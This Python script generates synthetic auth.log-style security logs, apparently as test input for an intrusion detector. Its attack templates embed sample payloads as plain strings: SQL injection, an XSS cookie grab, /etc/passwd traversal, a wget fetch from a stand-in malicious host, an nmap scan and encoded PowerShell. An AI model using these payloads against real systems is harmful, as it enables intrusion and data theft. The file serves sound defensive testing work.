"""
generator.py — Simulates a realistic security log stream (auth.log style)
mixing benign traffic with attack signatures, so the detector has
something to chew on. Can be run standalone: `python generator.py`
to continuously append lines, or imported and called for a one-shot batch.
"""
import random
import time
import os
from datetime import datetime

LOG_PATH = os.path.join(os.path.dirname(__file__), "logs", "auth.log")

USERS = ["admin", "svc_backup", "jdoe", "root", "analyst", "guest", "www-data"]
IPS = ["203.0.113.{}", "198.51.100.{}", "10.0.0.{}", "192.168.1.{}", "45.33.{}.{}"]

BENIGN_TEMPLATES = [
    "User {user} logged in successfully from {ip}",
    "Session established for {user} from {ip}",
    "Scheduled backup completed successfully",
    "Health check OK - service responding on port 443",
    "User {user} logged out from {ip}",
    "Config reload successful",
]

ATTACK_TEMPLATES = [
    "Failed login attempt for user {user} from {ip} - authentication failure",
    "SQL Injection attempt detected: ' OR 1=1 UNION SELECT username,password FROM users-- from {ip}",
    "Port scan detected from {ip} using nmap -sS -p 1-65535",
    "Malware signature match: ransomware payload executed on host from {ip}",
    "Privilege escalation attempt: sudo su detected for user {user} from {ip}",
    "XSS payload detected in request: <script>document.cookie</script> from {ip}",
    "Traffic spike detected from {ip} - possible DDoS / SYN flood attack",
    "Suspicious outbound connection - beacon detected to C2 checkin server from {ip}",
    "Phishing link clicked by {user} - credential harvest page reported",
    "Lateral movement detected: mimikatz pass-the-hash from {ip}",
    "Directory traversal attempt: GET /../../etc/passwd from {ip}",
    "Command injection detected: '; wget http://malicious.example/x.sh from {ip}",
    "Suspicious PowerShell execution: powershell -enc <base64> from {ip}",
    "Account locked out - excessive lockout events for {user} from {ip}",
    "Firewall rule violation: blocked outbound connection to {ip}",
    "Malicious file upload blocked: shell.php.jpg from {ip}",
]


def _rand_ip():
    tpl = random.choice(IPS)
    return tpl.format(*[random.randint(1, 254) for _ in range(tpl.count("{}"))])


def make_line(force_attack=None):
    is_attack = force_attack if force_attack is not None else (random.random() < 0.35)
    template = random.choice(ATTACK_TEMPLATES if is_attack else BENIGN_TEMPLATES)
    line = template.format(user=random.choice(USERS), ip=_rand_ip())
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return f"[{ts}] {line}"


def generate_batch(n=20):
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    lines = [make_line() for _ in range(n)]
    with open(LOG_PATH, "a") as f:
        for l in lines:
            f.write(l + "\n")
    return lines


if __name__ == "__main__":
    print(f"Streaming simulated logs to {LOG_PATH} — Ctrl+C to stop")
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    try:
        while True:
            line = make_line()
            with open(LOG_PATH, "a") as f:
                f.write(line + "\n")
            print(line)
            time.sleep(random.uniform(0.5, 2.5))
    except KeyboardInterrupt:
        print("\nStopped.")
